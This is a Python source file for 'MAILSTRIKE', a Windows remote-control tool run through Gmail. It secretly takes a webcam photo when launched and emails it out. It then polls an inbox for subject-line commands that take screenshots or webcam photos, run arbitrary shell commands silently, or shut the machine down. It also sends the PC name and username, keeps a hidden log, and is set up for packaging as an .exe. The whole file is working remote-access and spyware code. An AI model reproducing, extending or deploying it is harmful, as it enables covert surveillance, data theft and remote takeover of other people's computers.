

"""
MAILSTRIKE 🌀 - ULTIMATE Remote Control + Webcam + Screenshot (Windows)
Created by: shyclone - December 2025

Features:
- Initial webcam photo on startup (proof of who launched it)
- Remote commands via Gmail subject
- Silent background operation
- Hidden logging (.mailstrike_log.txt)
- PC name & username in every email
- Robust error recovery & retries
"""

import cv2
import imaplib
import email
import os
import time
import ctypes
import smtplib
import platform
import getpass
import datetime
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import decode_header
import configparser

#  ==================== CONFIG FROM FILE ====================
import configparser
import sys

# Get base path (handles PyInstaller bundle)
if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS  # Bundled temp dir for .exe
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

config_path = os.path.join(base_path, 'config.txt')

config = configparser.ConfigParser()
config.read(config_path)

YOUR_EMAIL   = config['DEFAULT']['YOUR_EMAIL']
APP_PASSWORD = config['DEFAULT']['APP_PASSWORD']
SENDER_EMAIL = config['DEFAULT']['SENDER_EMAIL']
# =========================================================

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT   = 587
IMAP_SERVER = "imap.gmail.com"

CHECK_INTERVAL = 10
SHUTDOWN_DELAY = 30
MAX_RETRIES    = 3
# =========================================================

# ==================== HIDDEN LOGGING ====================
def log_action(message):
    """Silent logging to hidden file - never crashes the program"""
    try:
        log_file = ".mailstrike_log.txt"
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"[{timestamp}] {message}\n"
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(entry)
    except:
        pass  # Silent fail

log_action("=== MAILSTRIKE STARTED ===")
# =======================================================

def decode_text(text):
    if not text:
        return ""
    try:
        decoded = decode_header(text)[0]
        if decoded[1]:
            return decoded[0].decode(decoded[1])
        return decoded[0]
    except:
        return str(text or "")

def show_popup(title, message):
    """Visible popup - only for check command"""
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 64)
    except:
        pass

def graceful_shutdown():
    log_action("SHUTDOWN command received")
    try:
        os.system(f"shutdown /s /t {SHUTDOWN_DELAY} /c \"MAILSTRIKE remote shutdown\"")
    except:
        pass

def send_email_with_attachment(subject, body_text, file_path=None, filename=None):
    try:
        pc_name = platform.node()
        username = getpass.getuser()

        full_body = f"🌀 Device: {pc_name}\n"
        full_body += f"User: {username}\n"
        full_body += f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        full_body += "-" * 40 + "\n"
        full_body += body_text

        msg = MIMEMultipart()
        msg['From'] = YOUR_EMAIL
        msg['To'] = YOUR_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(full_body, 'plain'))

        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                part = MIMEImage(f.read())
                part.add_header('Content-Disposition', 'attachment', filename=filename or os.path.basename(file_path))
                msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(YOUR_EMAIL, APP_PASSWORD)
        server.sendmail(YOUR_EMAIL, YOUR_EMAIL, msg.as_string())
        server.quit()

        log_action(f"Email sent: {subject}")
        return True
    except Exception as e:
        log_action(f"Email failed: {e}")
        return False

def capture_and_send_photo(photo_type="initial", user_note=""):
    photo_path = f"{photo_type}_photo.jpg"
    success = False

    for cam_index in [0, 1]:
        try:
            cap = cv2.VideoCapture(cam_index)
            time.sleep(0.8)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite(photo_path, frame)
                    success = True
                cap.release()
                if success:
                    break
        except:
            continue

    if not success:
        log_action(f"{photo_type.upper()} PHOTO: Capture failed")
        return

    subject = f"🌀 MAILSTRIKE - {photo_type.title()} Photo"
    body = f"{photo_type.title()} photo captured\n"
    if user_note:
        body += f"Note: {user_note}\n"

    send_email_with_attachment(subject, body, photo_path, f"{photo_type}_photo.jpg")
    if os.path.exists(photo_path):
        os.remove(photo_path)
    log_action(f"{photo_type.upper()} PHOTO sent successfully")

def send_initial_photo():
    log_action("Attempting initial photo")
    capture_and_send_photo("initial")

def send_screenshot_email(user_message=""):
    try:
        screenshot = ImageGrab.grab()
        path = "screenshot.png"
        screenshot.save(path)

        subject = "🌀 MAILSTRIKE - Screenshot"
        body = f"Screenshot captured\n"
        if user_message:
            body += f"Note: {user_message}\n"

        send_email_with_attachment(subject, body, path, "screenshot.png")
        if os.path.exists(path):
            os.remove(path)
        log_action("Screenshot sent")
    except Exception as e:
        log_action(f"Screenshot failed: {e}")

def run_remote_command(command_body):
    cmd = command_body.strip()
    if not cmd:
        return
    log_action(f"Running command: {cmd}")
    try:
        os.system(f"{cmd} >nul 2>&1")
        log_action("Command executed")
    except Exception as e:
        log_action(f"Command failed: {e}")

def capture_webcam_photo(user_message=""):
    capture_and_send_photo("webcam", user_message)


def process_emails():
    for attempt in range(MAX_RETRIES):
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER)
            mail.login(YOUR_EMAIL, APP_PASSWORD)
            mail.select("inbox")

            _, data = mail.search(None, "UNSEEN")
            email_ids = data[0].split()

            for eid in email_ids:
                _, msg_data = mail.fetch(eid, "(RFC822)")
                raw_email = msg_data[0][1]
                msg = email.message_from_bytes(raw_email)

                from_addr = msg.get("From", "")
                subject_raw = msg.get("Subject", "")
                subject = decode_text(subject_raw).strip().lower()

                body = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            body = part.get_payload(decode=True).decode(errors="ignore").strip()
                            break
                else:
                    body = msg.get_payload(decode=True).decode(errors="ignore").strip()

                if SENDER_EMAIL.lower() not in from_addr.lower():
                    continue

                log_action(f"Command received: {subject_raw}")

                if subject == "checkifitworks":
                    msg_text = body or "MAILSTRIKE is active!"
                    show_popup("MAILSTRIKE 🌀", msg_text)

                elif subject == "screenplz":
                    send_screenshot_email(body)

                elif subject == "whoisthere":
                    capture_webcam_photo(body)

                elif subject == "letsrun":
                    run_remote_command(body)

                elif subject == "shutdownmyfriend":
                    log_action("SHUTDOWN executed")
                    graceful_shutdown()
                    return "shutdown"

                mail.store(eid, '+FLAGS', '\\Seen')

            mail.close()
            mail.logout()
            return None

        except Exception as e:
            log_action(f"IMAP error (attempt {attempt+1}): {e}")
            time.sleep(5)

    log_action("IMAP failed after all retries")
    return None

def main():
    send_initial_photo()
    time.sleep(2)

    log_action("MAILSTRIKE fully initialized")

    while True:
        try:
            result = process_emails()
            if result == "shutdown":
                log_action("Shutting down")
                break
            time.sleep(CHECK_INTERVAL)
        except KeyboardInterrupt:
            log_action("Stopped by user")
            break
        except Exception as e:
            log_action(f"CRASH RECOVERY: {e}")
            time.sleep(10)

    log_action("=== MAILSTRIKE TERMINATED ===")

if __name__ == "__main__":
    main()
